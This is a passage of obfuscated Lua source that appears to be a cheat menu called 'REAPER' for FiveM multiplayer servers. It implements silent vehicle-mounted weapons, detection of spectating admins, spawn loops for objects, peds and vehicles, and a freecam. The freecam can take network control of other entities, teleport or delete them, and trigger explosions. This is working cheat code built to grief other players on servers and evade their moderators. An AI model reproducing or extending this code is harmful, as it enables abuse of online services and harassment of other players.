                        c2 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.5, 0, 1.1)
                        c3 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0, 0, 1.1)
                        x, y, z = c.x + direction.x * 10, c.y + direction.y * 10, c.z + direction.z * 10
                        x2, y2, z2 = c2.x + direction.x * 10, c2.y + direction.y * 10, c2.z + direction.z * 10
                        x3, y3, z3 = c3.x + direction.x * 10, c3.y + direction.y * 10, c3.z + direction.z * 10
                    elseif __REAPER1__.A['vehicle:weapons_position'].sindex == 3 then
                        c = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 2.0, 1.0, 0.5)
                        c2 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, -2.0, 1.0, 0.5)
                        c3 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0, 1.0, 0.5)
                        x, y, z = c.x + direction.x * 10, c.y + direction.y * 10, c.z + direction.z * 10
                        x2, y2, z2 = c2.x + direction.x * 10, c2.y + direction.y * 10, c2.z + direction.z * 10
                        x3, y3, z3 = c3.x + direction.x * 10, c3.y + direction.y * 10, c3.z + direction.z * 10
                    end

                    if __REAPER1__.A['vehicle:weapons_hold'].func and __REAPER1__.N.IsDisabledControlPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['vehicle:weapons_onkey'].func[__REAPER1__.A['vehicle:weapons_onkey'].sindex]]) or not __REAPER1__.A['vehicle:weapons_hold'].func and __REAPER1__.N.IsDisabledControlJustReleased(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['vehicle:weapons_onkey'].func[__REAPER1__.A['vehicle:weapons_onkey'].sindex]]) then
                        local weapon =  __REAPER1__.N.GetHashKey('weapon_' .. __REAPER1__.A['vehicle:weapons_bullet'].func[__REAPER1__.A['vehicle:weapons_bullet'].sindex])
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestWeaponAsset(weapon) then
                                if __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 1 then
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c, x, y, z, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                elseif __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 2 then
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c, x, y, z, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c2, x2, y2, z2, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                elseif __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 3 then
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c, x, y, z, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c2, x2, y2, z2, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(c3, x3, y3, z3, 10000, false, weapon, __REAPER1__.V.SelfPed, true, false, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:weapons_speed'].sindex))
                                end
                            end
                        end)
                    end

                    if __REAPER1__.A['vehicle:weapons_laser'].func then
                        if __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 1 then
                            __REAPER1__.N.DrawLine(c.x, c.y, c.z, x, y, z, 255, 0, 0, 255)
                        elseif __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 2 then
                            __REAPER1__.N.DrawLine(c.x, c.y, c.z, x, y, z, 255, 0, 0, 255)
                            __REAPER1__.N.DrawLine(c2.x, c2.y, c2.z, x2, y2, z2, 255, 0, 0, 255)
                        elseif __REAPER1__.A['vehicle:weapons_weaponcount'].sindex == 3 then
                            __REAPER1__.N.DrawLine(c.x, c.y, c.z, x, y, z, 255, 0, 0, 255)
                            __REAPER1__.N.DrawLine(c2.x, c2.y, c2.z, x2, y2, z2, 255, 0, 0, 255)
                            __REAPER1__.N.DrawLine(c3.x, c3.y, c3.z, x3, y3, z3, 255, 0, 0, 255)
                        end
                    end
                end

                if __REAPER1__.A['server_spectatorlist'].func then
                    __REAPER1__.N.DrawRect(0.915, 0.1, 0.16, 0.033, 30, 30, 30, 230)
                    __REAPER1__.F.DrawText('REAPER', 0.915, 0.083, 4, 255, 255, 255, 240, 0.33, true, false, true)
                    __REAPER1__.F.DrawText('Spectators', 0.915, 0.099, 0, 255, 255, 255, 240, 0.19, true, false, true)

                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        local coords = __REAPER1__.N.GetEntityCoords(ped)
                        if __REAPER1__.N.IsModelValid(__REAPER1__.N.GetEntityModel(ped)) and not __REAPER1__.N.IsEntityVisible(ped) and coords.x ~= 0 and not __REAPER1__.N.IsPedInAnyVehicle(ped) then
                            local ground, groundPos = __REAPER1__.N.GetGroundZFor_3dCoord(coords.x, coords.y, coords.z, 0)
                            if ground and (groundPos + 3.0 < coords.z or coords.z < groundPos - 2.0) and (not __REAPER1__.A['server_onlyonme'].func or #(coords - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)) <= 10.0) then
                                __REAPER1__.F.AddSpecPerson(__REAPER1__.N.GetPlayerServerId(v))
                            end
                        end
                    end

                    for k,v in ipairs(__REAPER1__.T.SpecPeople) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.id))
                        local coords = __REAPER1__.N.GetEntityCoords(ped)

                        if __REAPER1__.A['server_spectatorcoords'].func and __REAPER1__.A['server_timesincespec'].func then
                            __REAPER1__.F.DrawText('[' .. v.id .. '] ' .. v.name .. ' (' .. __REAPER1__.F.FloatLength(coords.x, 1) .. ', ' ..  __REAPER1__.F.FloatLength(coords.y, 1) .. ', ' ..  __REAPER1__.F.FloatLength(coords.z, 1) .. ' | ' .. __REAPER1__.F.FloatLength((__REAPER1__.N.GetGameTimer() - v.time) / 60000, 0) .. ' min)', 0.8375, v.y, 4, 255, 255, 255, 240, 0.3)
                        elseif __REAPER1__.A['server_spectatorcoords'].func then
                            __REAPER1__.F.DrawText('[' .. v.id .. '] ' .. v.name .. ' (' .. __REAPER1__.F.FloatLength((__REAPER1__.N.GetGameTimer() - v.time) / 60000, 0) .. ' min)', 0.8375, v.y, 4, 255, 255, 255, 240, 0.3)
                        elseif __REAPER1__.A['server_timesincespec'].func then
                            __REAPER1__.F.DrawText('[' .. v.id .. '] ' .. v.name .. ' (' .. __REAPER1__.F.FloatLength(coords.x, 1) .. ', ' ..  __REAPER1__.F.FloatLength(coords.y, 1) .. ', ' ..  __REAPER1__.F.FloatLength(coords.z, 1) ..')', 0.8375, v.y, 4, 255, 255, 255, 240, 0.3)
                        else
                            __REAPER1__.F.DrawText('[' .. v.id .. '] ' .. v.name, 0.8375, v.y, 4, 255, 255, 255, 240, 0.3)
                        end

                        __REAPER1__.N.DrawRect(0.915, v.y + 0.012, 0.16, 0.025, 50, 50, 50, 230)

                        local ground, groundPos = __REAPER1__.N.GetGroundZFor_3dCoord(coords.x, coords.y, coords.z, 0)
                        if not __REAPER1__.N.DoesEntityExist(ped) or __REAPER1__.N.IsEntityVisible(ped) or __REAPER1__.N.IsPedInAnyVehicle(ped) or ground and groundPos + 3.0 > coords.z or __REAPER1__.A['server_onlyonme'].func and #(coords - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)) > 10.0 then
                            for x,d in ipairs(__REAPER1__.T.SpecPeople) do
                                if x ~= 1 and x >= k then
                                    d.y = d.y - 0.018
                                end
                            end
                            table.remove(__REAPER1__.T.SpecPeople, k)
                        end
                    end
                end

                if __REAPER1__.A['spawning:objectspawner_loop'].toggle then
                    __REAPER1__.M.spawning.objectspawner.spawn(nil, __REAPER1__.A['spawning:objectspawner_loop'].sindex == 1 and __REAPER1__.A['spawning:objectspawner_custom'].func or __REAPER1__.A['spawning:objectspawner_object'].func, nil, __REAPER1__.A['spawning:objectspawner_loop'].sindex == 2 and __REAPER1__.A['spawning:objectspawner_object'].sindex or nil)
                end

                if __REAPER1__.A['spawning:pedspawner_loop'].toggle then
                    __REAPER1__.M.spawning.pedspawner.spawn(nil, __REAPER1__.A['spawning:pedspawner_loop'].sindex == 1 and __REAPER1__.A['spawning:pedspawner_custom'].func or __REAPER1__.A['spawning:pedspawner_pedestrian'].func, nil, __REAPER1__.A['spawning:pedspawner_loop'].sindex == 2 and __REAPER1__.A['spawning:pedspawner_pedestrian'].sindex or nil)
                end

                if __REAPER1__.A['spawning:pedspawner_ragdoll'].func then
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        if __REAPER1__.N.DoesEntityExist(v.p) and not __REAPER1__.N.IsEntityDead(v.p) then
                            __REAPER1__.N.SetPedToRagdoll(v.p, 1000, 1000, 0, 0, 0, 0)
                        end
                    end
                end

                if __REAPER1__.A['spawning:vehiclespawner_loop'].toggle then
                    __REAPER1__.M.spawning.vehiclespawner.spawn(nil, __REAPER1__.A['spawning:vehiclespawner_loop'].sindex == 1 and __REAPER1__.A['spawning:vehiclespawner_custom'].func or __REAPER1__.A['spawning:vehiclespawner_vehicle'].func, nil, __REAPER1__.A['spawning:vehiclespawner_loop'].sindex == 2 and __REAPER1__.A['spawning:vehiclespawner_vehicle'].sindex or nil)
                end

                if __REAPER1__.A['spawning_enableblips'].func then
                    if __REAPER1__.V.SpawningBlipLoop then
                        __REAPER1__.V.SpawningBlipLoop = false

                        for k,v in ipairs(__REAPER1__.T.SpawningBlips) do
                            __REAPER1__.N.RemoveBlip(v.blip)
                        end
                        __REAPER1__.T.SpawningBlips = {}

                        for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                            local blip = __REAPER1__.N.AddBlipForCoord(__REAPER1__.N.GetEntityCoords(v.o))
                            __REAPER1__.N.SetBlipSprite(blip, __REAPER1__.A['spawning_btype'].sindex - 1)
                            __REAPER1__.N.SetBlipScale(blip, __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning_bscale'].sindex)/10)
                            __REAPER1__.N.SetBlipColour(blip, __REAPER1__.A['spawning_color'].sindex - 1)
                            __REAPER1__.N.SetBlipAlpha(blip, __REAPER1__.A['spawning_alpha'].sindex - 1)
                            local t = {blip = blip, ent = v.o}
                            table.insert(__REAPER1__.T.SpawningBlips, t)
                        end
                        for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                            local blip = __REAPER1__.N.AddBlipForCoord(__REAPER1__.N.GetEntityCoords(v.p))
                            __REAPER1__.N.SetBlipSprite(blip, __REAPER1__.A['spawning_btype'].sindex - 1)
                            __REAPER1__.N.SetBlipScale(blip, __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning_bscale'].sindex) / 10)
                            __REAPER1__.N.SetBlipColour(blip, __REAPER1__.A['spawning_color'].sindex - 1)
                            __REAPER1__.N.SetBlipAlpha(blip, __REAPER1__.A['spawning_alpha'].sindex - 1)
                            local t = {blip = blip, ent = v.p}
                            table.insert(__REAPER1__.T.SpawningBlips, t)
                        end
                        for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                            local blip = __REAPER1__.N.AddBlipForCoord(__REAPER1__.N.GetEntityCoords(v.v))
                            __REAPER1__.N.SetBlipSprite(blip, __REAPER1__.A['spawning_btype'].sindex - 1)
                            __REAPER1__.N.SetBlipScale(blip, __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning_bscale'].sindex) / 10)
                            __REAPER1__.N.SetBlipColour(blip, __REAPER1__.A['spawning_color'].sindex - 1)
                            __REAPER1__.N.SetBlipAlpha(blip, __REAPER1__.A['spawning_alpha'].sindex - 1)
                            local t = {blip = blip, ent = v.v}
                            table.insert(__REAPER1__.T.SpawningBlips, t)
                        end
                    end

                    for k,v in ipairs(__REAPER1__.T.SpawningBlips) do
                        if __REAPER1__.N.DoesEntityExist(v.ent) then
                            __REAPER1__.N.BeginTextCommandSetBlipName('STRING')
                            __REAPER1__.N.AddTextComponentSubstringPlayerName('~b~Entity: ~s~' .. v.ent)
                            __REAPER1__.N.EndTextCommandSetBlipName(v.blip)
                            __REAPER1__.N.SetBlipCoords(v.blip, __REAPER1__.N.GetEntityCoords(v.ent))
                            __REAPER1__.N.SetBlipRotation(v.blip, math.ceil(__REAPER1__.N.GetEntityRotation(v.ent)[3]))
                        else
                            __REAPER1__.N.RemoveBlip(v.blip)
                            table.remove(__REAPER1__.T.SpawningBlips, k)
                        end
                    end
                end

                if __REAPER1__.A['spawning_loopparticle'].func then
                    __REAPER25__(function()
                        __REAPER26__(50)
                        __REAPER1__.M.spawning.particle()
                    end)
                end

                if __REAPER1__.A['misc_antiafk'].func and __REAPER1__.N.GetGameTimer() - (__REAPER1__.V.AfkTimer or 0) > __REAPER1__.A['misc_interval'].sindex * 1000 and not __REAPER1__.V.AntiAfking then
                    __REAPER1__.V.AfkTimer, __REAPER1__.V.AntiAfking = __REAPER1__.N.GetGameTimer(), true
                    if __REAPER1__.A['misc_move'].sindex == 1 then
                        __REAPER25__(function()
                            local random = math.random(1, 2)
                            __REAPER25__(function()
                                while __REAPER1__.V.AntiAfking and __REAPER1__.A['misc_antiafk'].func and __REAPER1__.A['misc_move'].sindex == 1 do
                                    __REAPER26__(100)
                                    __REAPER1__.N.SetGameplayCamRelativeRotation(random == 1 and (__REAPER1__.N.GetGameplayCamRot() - __REAPER1__.F.IntToFloat(math.random(1, 10))) or (__REAPER1__.N.GetGameplayCamRot() + __REAPER1__.F.IntToFloat(math.random(1, 10))))
                                end
                            end)
                            __REAPER26__(__REAPER1__.A['misc_length'].sindex * 500)
                            __REAPER1__.V.AntiAfking = false
                        end)
                    elseif __REAPER1__.A['misc_move'].sindex == 2 then
                        __REAPER25__(function()
                            __REAPER1__.N.TaskWanderStandard(__REAPER1__.V.SelfPed, 10.0, 10)
                            __REAPER1__.N.SetControlNormal(0, 32, 1.0)
                            __REAPER1__.N.SetControlNormal(0, 33, 1.0)
                            __REAPER26__(__REAPER1__.A['misc_length'].sindex * 500)
                            __REAPER1__.N.SetControlNormal(0, 32, 1.0)
                            __REAPER1__.N.SetControlNormal(0, 34, 1.0)
                            __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                            __REAPER1__.V.AntiAfking = false
                        end)
                    elseif __REAPER1__.A['misc_move'].sindex == 3 then
                        __REAPER25__(function()
                            local random = math.random(1, 2)
                            __REAPER1__.N.TaskWanderStandard(__REAPER1__.V.SelfPed, 10.0, 10)
                            __REAPER1__.N.SetControlNormal(0, 32, 1.0)
                            __REAPER1__.N.SetControlNormal(0, 33, 1.0)
                            __REAPER25__(function()
                                while __REAPER1__.V.AntiAfking and __REAPER1__.A['misc_antiafk'].func and __REAPER1__.A['misc_move'].sindex == 3 do
                                    __REAPER26__(100)
                                    __REAPER1__.N.SetGameplayCamRelativeRotation(random == 1 and (__REAPER1__.N.GetGameplayCamRot() - __REAPER1__.F.IntToFloat(math.random(1, 10))) or (__REAPER1__.N.GetGameplayCamRot() + __REAPER1__.F.IntToFloat(math.random(1, 10))))
                                end
                            end)
                            __REAPER26__(__REAPER1__.A['misc_length'].sindex * 500)
                            __REAPER1__.N.SetControlNormal(0, 32, 1.0)
                            __REAPER1__.N.SetControlNormal(0, 34, 1.0)
                            __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                            __REAPER1__.V.AntiAfking = false
                        end)
                    end
                end

                if __REAPER1__.A['misc_overridefov'].func and __REAPER1__.N.DoesCamExist(__REAPER1__.V.FovCamera) then
                    __REAPER1__.N.SetCamRot(__REAPER1__.V.FovCamera, __REAPER1__.N.GetGameplayCamRot(), 1)
                    __REAPER1__.N.SetCamCoord(__REAPER1__.V.FovCamera, __REAPER1__.N.GetGameplayCamCoord())
                end

                if __REAPER1__.A['misc_forceplycamera'].toggle then
                    __REAPER1__.N.SetFollowPedCamViewMode(__REAPER1__.A['misc_forceplycamera'].sindex == 4 and 4 or __REAPER1__.A['misc_forceplycamera'].sindex - 1)
                end

                if __REAPER1__.A['misc_forceradar'].toggle then
                    __REAPER1__.N.DisplayRadar(__REAPER1__.A['misc_forceradar'].sindex == 1 and 1 or 0)
                end

                if __REAPER1__.A['misc_extended'].toggle and not __REAPER1__.N.IsRadarHidden() then
                    __REAPER1__.N.SetBigmapActive(true, __REAPER1__.A['misc_extended'].sindex == 1 and 0 or 1)
                end

                if __REAPER1__.A['misc_2dimension'].func then
                    __REAPER1__.N.SetRadarAsInteriorThisFrame(`v_franklinshouse`, 0.0, 0.0, 0.0, 200)
                end

                if __REAPER1__.A['misc_centerself'].func then
                    __REAPER1__.N.DontTiltMinimapThisFrame()
                end

                if __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.N.DoesCamExist(__REAPER1__.V.Freecam) then
                    local camCoords = __REAPER1__.N.GetCamCoord(__REAPER1__.V.Freecam)
                    local camRot = __REAPER1__.N.GetCamRot(__REAPER1__.V.Freecam)
                    local forward, right = __REAPER1__.M.RotToQuat(camRot) * vector3(0.0, 1.0, 0.0), __REAPER1__.M.RotToQuat(camRot) * vector3(1.0, 0.0, 0.0)
                    local freecamSpeed = __REAPER1__.A['misc:freecam_speed'].sindex / 10
                    local newCamRot = vector3(camRot.x - __REAPER1__.N.GetDisabledControlNormal(0, 2) * __REAPER1__.A['misc:freecam_sensitivity'].sindex / 5, camRot.y, camRot.z - __REAPER1__.N.GetDisabledControlNormal(0, 1) * __REAPER1__.A['misc:freecam_sensitivity'].sindex / 5)
                    __REAPER1__.V.FreecamC, __REAPER1__.V.FreecamE = __REAPER1__.M.RayCastCamera(__REAPER1__.V.Freecam, camRot, camCoords, 1000.0)

                    __REAPER1__.N.DisableAllControlActions(0)
                    __REAPER1__.N.EnableControlAction(0, 1, true)
                    __REAPER1__.N.EnableControlAction(0, 2, true)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 21) then freecamSpeed = freecamSpeed * 3
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 36) then freecamSpeed = freecamSpeed / 3
                    end

                    if __REAPER1__.N.IsDisabledControlPressed(0, 32) then __REAPER1__.V.FreecamKey = true camCoords = camCoords + forward * freecamSpeed end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 33) then __REAPER1__.V.FreecamKey = true camCoords = camCoords + forward * - freecamSpeed end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 30) then  __REAPER1__.V.FreecamKey = true  camCoords = camCoords + right * freecamSpeed end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 34) then __REAPER1__.V.FreecamKey = true camCoords = camCoords + right * - freecamSpeed end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 38) then __REAPER1__.V.FreecamKey = true camCoords = vector3(camCoords.x, camCoords.y, camCoords.z + freecamSpeed) end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 44) then __REAPER1__.V.FreecamKey = true camCoords = vector3(camCoords.x, camCoords.y, camCoords.z - freecamSpeed)  end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 17) and not __REAPER1__.N.IsDisabledControlPressed(0, 348) then --fel g??rg??
                        __REAPER1__.V.FreecamFov = __REAPER1__.V.FreecamFov < 130 and __REAPER1__.V.FreecamFov + 1 or 130
                        __REAPER1__.N.SetCamFov(__REAPER1__.V.Freecam, __REAPER1__.F.IntToFloat(__REAPER1__.V.FreecamFov))
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 16) and not __REAPER1__.N.IsDisabledControlPressed(0, 348) then --le g??rg??
                        __REAPER1__.V.FreecamFov = __REAPER1__.V.FreecamFov > 1 and __REAPER1__.V.FreecamFov - 1 or 0
                        __REAPER1__.N.SetCamFov(__REAPER1__.V.Freecam, __REAPER1__.F.IntToFloat(__REAPER1__.V.FreecamFov))
                    end

                    if __REAPER1__.V.FreecamKey then
                        __REAPER1__.N.SetCamCoord(__REAPER1__.V.Freecam, camCoords.x, camCoords.y, camCoords.z)
                    end

                    __REAPER1__.N.SetCamRot(__REAPER1__.V.Freecam, newCamRot.x < -85.0 and -85.0 or newCamRot.x > 100.0 and 100.0 or newCamRot.x, newCamRot.y, newCamRot.z, 0)
                    __REAPER1__.V.FreecamKey = false

                    __REAPER1__.N.SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0, 0, 0)
                    __REAPER1__.N.BadabingBadaboom(camCoords.x, camCoords.y)

                    if not __REAPER1__.N.HasCollisionLoadedAroundEntity(__REAPER1__.V.SelfPed) then
                        __REAPER1__.N.RequestCollisionAtCoord(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed))
                    end

                    if __REAPER1__.A['misc:freecam_crosshair'].func then
                        __REAPER1__.N.DrawRect(0.5, 0.5, 0.003, 0.017, 0, 0, 0, __REAPER1__.V.FreecamE and __REAPER1__.A['misc:freecam_entityhover'].func and 150 or 255)
                        __REAPER1__.N.DrawRect(0.5, 0.5, 0.0105, 0.004, 0, 0, 0, __REAPER1__.V.FreecamE and __REAPER1__.A['misc:freecam_entityhover'].func and 150 or 255)
                        __REAPER1__.N.DrawRect(0.5, 0.5, 0.0011, 0.015, 255, 255, 255, __REAPER1__.V.FreecamE and __REAPER1__.A['misc:freecam_entityhover'].func and 150 or 255)
                        __REAPER1__.N.DrawRect(0.5, 0.5, 0.0085, 0.001, 255, 255, 255, __REAPER1__.V.FreecamE and __REAPER1__.A['misc:freecam_entityhover'].func and 150 or 255)
                    end

                    if __REAPER1__.A['misc:freecam_coords'].func then
                        __REAPER1__.F.DrawText(__REAPER1__.F.FloatLength(__REAPER1__.V.FreecamC.x, 2) .. ' ' .. __REAPER1__.F.FloatLength(__REAPER1__.V.FreecamC.y, 2) .. ' ' .. __REAPER1__.F.FloatLength(__REAPER1__.V.FreecamC.z, 2), 0.5, 0.52, 4, 255, 255, 255, __REAPER1__.V.FreecamE and __REAPER1__.A['misc:freecam_entityhover'].func and 150 or 255, 0.27, true, false, true)
                    end

                    if __REAPER1__.N.IsDisabledControlJustReleased(0, 25) and __REAPER1__.V.FreecamE and __REAPER1__.V.FreecamE ~= __REAPER1__.V.SelfPed then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.FreecamE)
                    end

                    if __REAPER1__.N.IsDisabledControlPressed(0, 348) then
                        if __REAPER1__.N.IsDisabledControlPressed(0, 17) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.FreecamTimer or 0) then
                            __REAPER1__.V.FreecamTimer = __REAPER1__.N.GetGameTimer() + 100
                            __REAPER1__.V.FreecamMode = __REAPER1__.V.FreecamMode == 9 and 1 or __REAPER1__.V.FreecamMode + 1
                        elseif __REAPER1__.N.IsDisabledControlPressed(0, 16) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.FreecamTimer or 0) then
                            __REAPER1__.V.FreecamTimer = __REAPER1__.N.GetGameTimer() + 100
                            __REAPER1__.V.FreecamMode = __REAPER1__.V.FreecamMode == 1 and 9 or __REAPER1__.V.FreecamMode - 1
                        end
                    end

                    local t = __REAPER1__.T.Freecam[__REAPER1__.V.FreecamMode]
                    if __REAPER1__.N.IsDisabledControlPressed(0, 174) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.FreecamTimer or 0) and __REAPER1__.V.FreecamMode ~= 1 and __REAPER1__.V.FreecamMode ~= 9 then
                        __REAPER1__.V.FreecamTimer = __REAPER1__.N.GetGameTimer() + 100
                        t.sub = t.sub == #t.tablem and 1 or t.sub + 1
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 175) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.FreecamTimer or 0) and __REAPER1__.V.FreecamMode ~= 1 and __REAPER1__.V.FreecamMode ~= 9 then
                        __REAPER1__.V.FreecamTimer = __REAPER1__.N.GetGameTimer() + 100
                        t.sub = t.sub == 1 and #t.tablem or t.sub - 1
                    end

                    if __REAPER1__.V.FreecamMode == 1 then
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 45) then
                            __REAPER1__.V.FreecamButton = __REAPER1__.V.FreecamButton == __REAPER1__.N.IsDisabledControlPressed and __REAPER1__.N.IsDisabledControlJustReleased or __REAPER1__.N.IsDisabledControlPressed
                        end
                    elseif __REAPER1__.V.FreecamMode == 9 then
                        if __REAPER1__.N.IsDisabledControlJustPressed(0, 24) and __REAPER1__.V.FreecamE then
                            __REAPER25__(function()
                                if __REAPER1__.F.NetControl(__REAPER1__.V.FreecamE) then
                                    __REAPER1__.V.FreecamIgnore = __REAPER1__.V.FreecamE
                                    __REAPER1__.N.SetEntityAlpha(__REAPER1__.V.FreecamE, 102, false)
                                end
                            end)
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 24) and __REAPER1__.V.FreecamIgnore then
                            __REAPER1__.N.ResetEntityAlpha(__REAPER1__.V.FreecamIgnore)
                            __REAPER1__.V.FreecamLastEnt = __REAPER1__.V.FreecamIgnore
                            __REAPER1__.V.FreecamIgnore = nil
                        elseif __REAPER1__.N.IsDisabledControlPressed(0, 24) and __REAPER1__.V.FreecamIgnore then
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.FreecamIgnore, __REAPER1__.V.FreecamC.x, __REAPER1__.V.FreecamC.y, __REAPER1__.V.FreecamC.z + 1.0, true, true, true)
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 24) and __REAPER1__.N.IsDisabledControlPressed(0, 19) and __REAPER1__.V.FreecamLastEnt then
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.FreecamLastEnt, __REAPER1__.V.FreecamC.x, __REAPER1__.V.FreecamC.y, __REAPER1__.V.FreecamC.z + 1.0, true, true, true)
                        end
                    elseif __REAPER1__.V.FreecamMode ~= 9 and __REAPER1__.V.FreecamButton(0, 24) then
                        local hash = t.sub == 1 and t.tablem[math.random(2, #t.tablem)] or t.tablem[t.sub]
                        __REAPER25__(function()
                            if __REAPER1__.V.FreecamMode <= 5 then
                                local ent = nil
                                if __REAPER1__.F.RequestEntity(hash.key) then
                                    if __REAPER1__.V.FreecamMode == 2 then
                                        ent = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(hash.key), hash.key, __REAPER1__.V.FreecamC, true, true)
                                        if t.cnum == 2 then
                                            __REAPER1__.N.SetPedAngry(ent)
                                        elseif t.cnum == 3 then
                                            __REAPER1__.N.SetPedSeeingRange(ent, 0.0)
                                        elseif t.cnum == 4 then
                                            __REAPER1__.N.SetPedHearingRange(ent, 0.0)
                                        end
                                    elseif __REAPER1__.V.FreecamMode == 3 then
                                        ent = __REAPER1__.N.CreateVehicle(hash.key, __REAPER1__.V.FreecamC, math.random(1, 360), true, true)
                                    elseif __REAPER1__.V.FreecamMode >= 4 then
                                        ent = __REAPER1__.N.CreateObject(hash.key, __REAPER1__.V.FreecamC, true, true, false)
                                    end
                                end
                                
                                if t.launch then
                                    __REAPER1__.N.ApplyForceToEntity(ent, 3, forward * 5000, 0, 0, 0, false, false, true, true, false, true)
                                end
                                if t.pnum == 2 then
                                    __REAPER1__.N.SetEntityInvincible(ent, true)
                                elseif t.pnum == 3 then
                                    __REAPER1__.N.SetEntityVisible(ent, false)
                                elseif t.pnum == 4 then
                                    __REAPER1__.N.SetEntityInvincible(ent, true)
                                    __REAPER1__.N.SetEntityVisible(ent, false)
                                end
                                
                                if t.cleanup then
                                    __REAPER26__(500)
                                    __REAPER1__.N.DeleteEntity(ent)
                                    return
                                end

                                table.insert(__REAPER1__.T.FreecamSpawns[t.ins], ent)
                            elseif __REAPER1__.V.FreecamMode == 6 then
                                if __REAPER1__.F.RequestWeaponAsset(hash.key) then
                                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(camCoords, __REAPER1__.V.FreecamC, t.damage[t.dnum], 0, hash.key, t.silent and __REAPER1__.V.FreecamSilentPed or __REAPER1__.V.SelfPed, true, false, 500.0)
                                end
                            elseif __REAPER1__.V.FreecamMode == 7 then
                                __REAPER1__.N.DoParticle(hash.dict, hash.pname, __REAPER1__.V.FreecamC.x, __REAPER1__.V.FreecamC.y, __REAPER1__.V.FreecamC.z, t.size[t.snum], 0, 0, 0, 0, 0, 0)
                            elseif __REAPER1__.V.FreecamMode == 8 then
                                __REAPER1__.N.CreateExplosion(__REAPER1__.V.FreecamC, t.sub == 1 and math.random(2, #t.tablem) - 3 or t.sub - 2, t.damage[t.dnum], t.audible, t.invisible, 0)
                            end
                        end)
                    elseif __REAPER1__.V.FreecamMode <= 5 and __REAPER1__.V.FreecamMode ~= 9 then
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 25) and __REAPER1__.N.IsDisabledControlPressed(0, 19) then
                            for k,v in ipairs(__REAPER1__.T.FreecamSpawns[t.ins]) do
                                __REAPER1__.N.DeleteEntity(v)
                            end
                            __REAPER1__.T.FreecamSpawns[t.ins] = {}
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 45) then
                            t.pnum = t.pnum == 4 and 1 or t.pnum + 1
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 23) then
                            t.cleanup = not t.cleanup
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 26) then
                            t.launch = not t.launch
